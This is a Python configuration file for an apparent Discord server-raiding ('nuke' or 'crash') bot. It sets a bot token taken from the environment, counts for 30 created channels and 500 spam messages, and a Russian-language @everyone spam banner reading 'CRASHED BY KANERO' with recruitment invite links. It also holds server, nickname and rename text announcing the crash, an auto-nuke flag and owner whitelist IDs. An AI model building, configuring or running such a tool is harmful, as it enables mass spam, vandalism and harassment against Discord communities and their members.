import os

# Токен читается из переменной окружения (безопасно для GitHub)
# Пробуем DISCORD_TOKEN, потом TOKEN, потом пустая строка
TOKEN = os.environ.get("DISCORD_TOKEN") or os.environ.get("TOKEN", "")
CHANNELS_COUNT = 30
SPAM_COUNT = 500
SPAM_TEXT = "|| @everyone @here ||\n\n╔══════════════════════════════════════╗\n║          ☠️ **CRASHED BY KANERO**          ║\n║    ┊ɪɴᴛᴀʀᴀᴋᴛɪᴠᴇ sǫᴜᴀᴅ┊    ║\n╚══════════════════════════════════════╝\n\n✨ **Краш от имени Интерактив клана!** ✨\nМы представляем их интересы и действуем от их лица!\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🎯 **Хочешь такую же мощь?**\n**Присоединяйся к нашей команде!**\n\n🔗 **Наш Discord:**\nhttps://discord.gg/EfwrMSZbsE\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n⚡ **☠️ Kanero** ⚡\n**Официальное сообщество:**\nhttps://discord.gg/aud6wwYVRd\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n💖 **Developer - DavaidKa** 💖\n*С любовью к качественному крашу*"
GUILD_NAME = "Kanero"
GUILD_DESCRIPTION = "Вы были крашнуты By Kanero"
RENAME_TEXT = "Вы были крашнуты By Kanero"
NICK = "Вы были крашнуты By Kanero"
AUTO_NUKE = False

# Owner ID — читается из переменной окружения или используется значение по умолчанию
OWNER_ID = int(os.environ.get("OWNER_ID", "1421778029310509056"))

# Whitelist — сюда добавляй Discord ID пользователей
WHITELIST = [1421778029310509056]

# Owner whitelist — управляется только овнером через ЛС
OWNER_WHITELIST = [1421778029310509056]
